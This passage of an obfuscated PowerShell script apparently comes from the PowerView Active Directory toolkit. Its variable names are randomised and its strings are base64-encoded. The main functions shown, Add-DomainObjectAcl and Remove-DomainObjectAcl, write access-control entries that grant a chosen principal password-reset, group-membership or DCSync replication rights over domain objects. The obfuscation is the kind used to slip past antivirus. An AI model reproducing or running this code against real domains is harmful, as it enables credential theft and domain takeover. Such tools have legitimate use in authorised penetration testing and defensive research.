${ab60642cfdad4aa794979e386ee76820}) {
                               
 $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) 
$Object.distinguishedname[0]
                                $_ | 
Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) 
$ObjectSid
                                
${417c070585854c20aed074f685b4ea33} = $True
                          
  }
                        }
                        else {
           
                 $_ | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
          
                  $_ | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAUwBJAEQA'))) $ObjectSid
                            
${417c070585854c20aed074f685b4ea33} = $True
                        
}
                        if (${417c070585854c20aed074f685b4ea33}) {
  
                          $_ | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) 
([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], 
$_.AccessMask))
                            if 
(${ca3d4121ac6f47a0a0442dc1d46ba182}) {
                              
  ${929fd9bb368c4eb6a0e4d50b91e35ef7} = @{}
                          
      $_.psobject.properties | ForEach-Object {
                      
              if ($_.Name -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAVAB5AHAAZQB8AEkAbgBoAGUAcgBpAHQAZQBkAE8AYgBqAGUAYw
B0AFQAeQBwAGUAfABPAGIAagBlAGMAdABBAGMAZQBUAHkAcABlAHwASQBuAGgAZQByAG
kAdABlAGQATwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA=')))) {
                
                        try {
                                        
    ${929fd9bb368c4eb6a0e4d50b91e35ef7}[$_.Name] = 
${ca3d4121ac6f47a0a0442dc1d46ba182}[$_.Value.toString()]
             
                           }
                                        
catch {
                                            
${929fd9bb368c4eb6a0e4d50b91e35ef7}[$_.Name] = $_.Value
              
                          }
                                    }
     
                               else {
                                
        ${929fd9bb368c4eb6a0e4d50b91e35ef7}[$_.Name] = $_.Value
      
                              }
                                }
     
                           ${11db20332bf3430ea33345bb38dd0d07} = 
New-Object -TypeName PSObject -Property 
${929fd9bb368c4eb6a0e4d50b91e35ef7}
                                
${11db20332bf3430ea33345bb38dd0d07}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                          
      ${11db20332bf3430ea33345bb38dd0d07}
                            
}
                            else {
                                
$_.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                          
      $_
                            }
                        }
       
             }
                }
                catch {
               
     Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHIAcg
BvAHIAOgAgACQAXwA=')))
                }
            }
        }
    }
}
function Add-DomainObjectAcl {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
   
     $TargetIdentity,
        [ValidateNotNullOrEmpty()]
        
[String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
     
   [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
       
 [ValidateNotNullOrEmpty()]
        [String]
        
$TargetSearchBase,
        [Parameter(Mandatory = $True)]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        
$PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        
[String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
  
      [Alias('DomainController')]
        [String]
        $Server,
    
    [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
     
   $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [ValidateSet
('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
  
      $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    
BEGIN {
        ${b6f46b860c704d55ab354cb28eda48f9} = @{
            
'Properties' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            
'Raw' = $True
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${787ec3d44efc4a30a68ac607b7c2216b} = @{
            'Identity' = 
$PrincipalIdentity
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcw
BpAGQA')))
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${0a3a135f6d4b4501b5ecb90a7bb5d6af} = Get-DomainObject 
@787ec3d44efc4a30a68ac607b7c2216b
        if (-not 
${0a3a135f6d4b4501b5ecb90a7bb5d6af}) {
            throw 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcA
BhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
   
     }
    }
    PROCESS {
        ${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $TargetIdentity
        
${b0ef3c21d8e9421fa0bd1126300ad5b2} = Get-DomainObject 
@b6f46b860c704d55ab354cb28eda48f9
        ForEach 
(${d206fb27c46c457685596d5b60010b1a} in 
${b0ef3c21d8e9421fa0bd1126300ad5b2}) {
            $InheritanceType = 
[System.DirectoryServices.ActiveDirectorySecurityInheritance] 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAG4AZQA=')))
            ${9d4ad4fd968448dc9b1db62924580868} = 
[System.Security.AccessControl.AccessControlType] 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBsAGwAbwB3AA==')))
            
${28e002edc5af4b2d8fd052d89cb97144} = @()
            if 
($RightsGUID) {
                ${ca3d4121ac6f47a0a0442dc1d46ba182} = 
@($RightsGUID)
            }
            else {
                
${ca3d4121ac6f47a0a0442dc1d46ba182} = Switch ($Rights) {
             
       $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMA
AwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMA
AwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMA
AwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMA
AwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMA
BmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
    
        ForEach (${879aa1a407054d1ebb0a151e486c44bb} in 
${0a3a135f6d4b4501b5ecb90a7bb5d6af}) {
                Write-Verbose 
"[Add-DomainObjectAcl] Granting principal 
$(${879aa1a407054d1ebb0a151e486c44bb}.distinguishedname) '$Rights' 
on 
$(${d206fb27c46c457685596d5b60010b1a}.Properties.distinguishedname)"
                try {
                    $Identity = 
[System.Security.Principal.IdentityReference] 
([System.Security.Principal.SecurityIdentifier]${879aa1a407054d1ebb0
a151e486c44bb}.objectsid)
                    if 
(${ca3d4121ac6f47a0a0442dc1d46ba182}) {
                        
ForEach (${536c95c6ac344afbad492821cdfaf6d0} in 
${ca3d4121ac6f47a0a0442dc1d46ba182}) {
                            
${549f6c3975f0474e8a22ad09deb46f3e} = New-Object Guid 
${536c95c6ac344afbad492821cdfaf6d0}
                            
${abd67b00d80f4f4186e0a9dcac65a4e2} = 
[System.DirectoryServices.ActiveDirectoryRights] 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                           
 ${28e002edc5af4b2d8fd052d89cb97144} += New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule $Identity, 
${abd67b00d80f4f4186e0a9dcac65a4e2}, 
${9d4ad4fd968448dc9b1db62924580868}, 
${549f6c3975f0474e8a22ad09deb46f3e}, $InheritanceType
                
        }
                    }
                    else {
             
           ${abd67b00d80f4f4186e0a9dcac65a4e2} = 
[System.DirectoryServices.ActiveDirectoryRights] 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        
${28e002edc5af4b2d8fd052d89cb97144} += New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule $Identity, 
${abd67b00d80f4f4186e0a9dcac65a4e2}, 
${9d4ad4fd968448dc9b1db62924580868}, $InheritanceType
                
    }
                    ForEach 
(${2eeb97e7673d438b98bd02924fa03721} in 
${28e002edc5af4b2d8fd052d89cb97144}) {
                        
Write-Verbose "[Add-DomainObjectAcl] Granting principal 
$(${879aa1a407054d1ebb0a151e486c44bb}.distinguishedname) rights GUID 
'$(${2eeb97e7673d438b98bd02924fa03721}.ObjectType)' on 
$(${d206fb27c46c457685596d5b60010b1a}.Properties.distinguishedname)"
                        ${724b98f5dcd04d7dade149fb3cf3d520} = 
${d206fb27c46c457685596d5b60010b1a}.GetDirectoryEntry()
              
          
${724b98f5dcd04d7dade149fb3cf3d520}.PsBase.Options.SecurityMasks = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABhAGMAbAA=')))
                        
${724b98f5dcd04d7dade149fb3cf3d520}.PsBase.ObjectSecurity.AddAccessR
ule(${2eeb97e7673d438b98bd02924fa03721})
                        
${724b98f5dcd04d7dade149fb3cf3d520}.PsBase.CommitChanges()
           
         }
                }
                catch {
                   
 Write-Verbose "[Add-DomainObjectAcl] Error granting principal 
$(${879aa1a407054d1ebb0a151e486c44bb}.distinguishedname) '$Rights' 
on 
$(${d206fb27c46c457685596d5b60010b1a}.Properties.distinguishedname) 
: $_"
                }
            }
        }
    }
}
function Remove-
DomainObjectAcl {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
   
     $TargetIdentity,
        [ValidateNotNullOrEmpty()]
        
[String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
     
   [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
       
 [ValidateNotNullOrEmpty()]
        [String]
        
$TargetSearchBase,
        [Parameter(Mandatory = $True)]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        
$PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        
[String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
  
      [Alias('DomainController')]
        [String]
        $Server,
    
    [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
     
   $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [ValidateSet
('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
  
      $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    
BEGIN {
        ${b6f46b860c704d55ab354cb28eda48f9} = @{
            
'Properties' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            
'Raw' = $True
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${787ec3d44efc4a30a68ac607b7c2216b} = @{
            'Identity' = 
$PrincipalIdentity
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcw
BpAGQA')))
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${787ec3d44efc4a30a68ac607b7c2216b}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${0a3a135f6d4b4501b5ecb90a7bb5d6af} = Get-DomainObject 
@787ec3d44efc4a30a68ac607b7c2216b
        if (-not 
${0a3a135f6d4b4501b5ecb90a7bb5d6af}) {
            throw 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcA
BhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
   
     }
    }
    PROCESS {
        ${b6f46b860c704d55ab354cb28eda48f9}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $TargetIdentity
        
${b0ef3c21d8e9421fa0bd1126300ad5b2} = Get-DomainObject 
@b6f46b860c704d55ab354cb28eda48f9
        ForEach 
(${d206fb27c46c457685596d5b60010b1a} in 
${b0ef3c21d8e9421fa0bd1126300ad5b2}) {
            $InheritanceType = 
[System.DirectoryServices.ActiveDirectorySecurityInheritance] 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAG4AZQA=')))
            ${9d4ad4fd968448dc9b1db62924580868} = 
[System.Security.AccessControl.AccessControlType] 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBsAGwAbwB3AA==')))
            
${28e002edc5af4b2d8fd052d89cb97144} = @()
            if 
($RightsGUID) {
                ${ca3d4121ac6f47a0a0442dc1d46ba182} = 
@($RightsGUID)
            }
            else {
                
${ca3d4121ac6f47a0a0442dc1d46ba182} = Switch ($Rights) {
             
       $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMA
AwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMA
AwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMA
AwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMA
AwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMA
BmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
    
        ForEach (${879aa1a407054d1ebb0a151e486c44bb} in 
${0a3a135f6d4b4501b5ecb90a7bb5d6af}) {
                Write-Verbose 
"[Remove-DomainObjectAcl] Removing principal 
$(${879aa1a407054d1ebb0a151e486c44bb}.distinguishedname) '$Rights' 
from 
$(${d206fb27c46c457685596d5b60010b1a}.Properties.distinguishedname)"
                try {
                    $Identity = 
[System.Security.Principal.IdentityReference] 
([System.Security.Principal.SecurityIdentifier]${879aa1a407054d1ebb0
a151e486c44bb}.objectsid)
                    if 
(${ca3d4121ac6f47a0a0442dc1d46ba182}) {
                        
ForEach (${536c95c6ac344afbad492821cdfaf6d0} in 
${ca3d4121ac6f47a0a0442dc1d46ba182}) {
                            
${549f6c3975f0474e8a22ad09deb46f3e} = New-Object Guid 
